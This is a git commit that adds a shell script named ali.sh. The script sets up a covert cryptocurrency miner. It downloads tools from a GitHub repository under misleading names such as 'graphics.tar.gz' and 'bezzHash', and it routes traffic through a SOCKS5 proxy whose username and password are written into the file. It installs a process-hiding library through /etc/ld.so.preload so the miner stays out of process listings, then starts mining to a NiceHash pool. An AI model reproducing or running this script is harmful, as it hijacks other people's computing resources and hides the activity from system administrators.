db7916a1dad1d2a4ab2b2fa2e05c5c05febaa79c
Kunyuktea <93093379+Kunyuktea@users.noreply.github.com>
2022-03-10 11:52:25 +0700

    Create ali.sh

---
+++ ali.sh
@@ -0,0 +1,47 @@
+#!/bin/sh 
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime 
+dpkg-reconfigure --frontend noninteractive tzdata 
+ 
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl 
+ 
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz 
+ 
+tar -xvzf graphics.tar.gz 
+ 
+cat > graftcp/local/graftcp-local.conf <<END 
+listen = :2233 
+loglevel = 1 
+socks5 = 52.15.235.202:1080 
+socks5_username = mikrotik999 
+socks5_password = Elibawnos 
+END 
+ 
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf & 
+ 
+sleep .2 
+ 
+echo " " 
+echo " " 
+ 
+echo "" 
+ 
+./graftcp/graftcp curl ifconfig.me 
+ 
+echo " " 
+echo " " 
+ 
+echo "" 
+ 
+echo " " 
+echo " " 
+ 
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash 
+chmod +x bezzHash 
+ 
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
+unzip magicBezzHash.zip 
+make 
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
+mv libprocesshider.so /usr/local/lib/ 
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
+./graftcp/graftcp ./bezzHash --url=ssl://3FNS3ubK3e76wiiLPMTK4K2ESw1GUgtXh5@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
